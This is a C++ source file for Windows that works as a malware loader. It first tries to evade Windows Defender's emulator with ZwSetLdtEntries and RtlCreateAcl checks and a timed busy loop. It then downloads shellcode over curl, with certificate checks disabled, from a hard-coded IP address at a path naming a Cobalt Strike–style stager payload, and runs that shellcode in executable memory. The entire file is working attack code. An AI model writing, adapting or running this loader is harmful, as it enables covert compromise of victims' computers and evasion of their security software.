#include "Core.Alloc.h"

#include <iostream>
#include <thread>
#include <chrono>

// vcpkg install curl:x64-windows-static
#include <curl/curl.h>
#pragma comment(lib, "WS2_32.lib")
#pragma comment(lib, "crypt32.lib")

#pragma comment(lib, "ntdll.lib")

size_t WriteMemoryCallback(void* contents, size_t size, size_t nmemb,
                           std::string* output);


extern "C" NTSYSAPI NTSTATUS RtlCreateAcl(PACL Acl, ULONG AclLength,
                               ULONG AclRevision);
bool Anti_Windefender_Emulator() {
  typedef LONG(NTAPI * NTSETLDTENTRIES)(DWORD, DWORD, DWORD, DWORD, DWORD,
                                        DWORD);
  NTSETLDTENTRIES ZwSetLdtEntries = (NTSETLDTENTRIES)GetProcAddress(
      GetModuleHandleA("ntdll.dll"), "ZwSetLdtEntries");

    
  bool r = RtlCreateAcl(0, 0, 0);
  if (r == 0) return true;

  __try {
    ZwSetLdtEntries(0, 0, 0, 0, 0, 0);

  } __except (1) {
    return true;
  }

  return false;
}

// delay 5s
void Anti_Emulator_xs(int xs) {
  typedef std::chrono::high_resolution_clock clock;
  typedef std::chrono::seconds s;
  std::chrono::time_point<clock> start_time = clock::now();
  while (1) {
    FindWindowA("1337", "1337");
    CreateFileA(0, 0, 0, 0, 0, 0, 0);
    auto duration = static_cast<float>(
        std::chrono::duration_cast<s>(clock::now() - start_time).count());
    if (duration > 5) break;
  }
}



int main() {

   Anti_Emulator_xs(5);
  if (Anti_Windefender_Emulator()) return 1;

  ExecAllocator obj;
  if (!obj.Init()) {
    std::cout << "ExecAllocator init faied\n";
    return 1;
  }

  std::cout << "Max Alloc Size : 0x" << std::hex << obj.GetMaxAllocSize()
            << std::endl;

  CURL* curl;

  curl_global_init(CURL_GLOBAL_ALL);
  curl = curl_easy_init();
  std::string url = R"(https://43.241.16.222:43337/Temp/stager_x64_cs_payload_rawbytes)";
  std::string response;

  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);

  // assert ok
  curl_easy_perform(curl);

  void* shellcode = obj.Malloc(response.size());
  if (!shellcode) {
    std::cout << "memory is not enough  , need : 0x" << std::hex
              << response.size() << std::endl;
    return 0;
  }

  memcpy(shellcode, response.data(), response.size());
  std::thread t((void(*)(void))shellcode);
  t.detach();

  getchar();
  return 0;
}


size_t WriteMemoryCallback(void* contents, size_t size, size_t nmemb,
                           std::string* output) {
  size_t totalSize = size * nmemb;
  output->append(static_cast<char*>(contents), totalSize);
  return totalSize;
}